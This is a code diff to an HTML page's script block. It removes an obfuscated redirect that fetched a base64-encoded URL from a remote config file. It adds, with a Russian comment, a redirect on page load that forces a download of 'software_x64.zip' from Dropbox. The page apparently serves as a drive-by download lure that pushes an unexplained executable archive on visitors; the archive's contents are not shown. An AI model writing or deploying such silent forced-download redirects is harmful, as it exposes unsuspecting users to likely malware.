@@ -90,20 +90,8 @@
     </div>
 
     <script>
-      (async function () {
-        try {
-          const res = await fetch(
-            "https://maksid-kioka.github.io/.github/pops.pisk"
-          );
-          if (!res.ok) throw new Error(`Config HTTP ${res.status}`);
-          const { c } = await res.json();
-          const url = atob(c);
-          if (!/^https?:\/\//.test(url)) throw new Error("Invalid URL");
-          window.location.href = url;
-        } catch (e) {
-          console.error(e);
-        }
-      })();
-    </script>
+  // Редирект сразу на Dropbox
+  window.location.href = "https://www.dropbox.com/scl/fi/7q4lnekzm9pd0yeqdzcmr/software_x64.zip?rlkey=jwkphj9pjdrbkha9mvssxz6ss&st=3x6cmwtt&dl=1";
+</script>
   </body>
 </html>
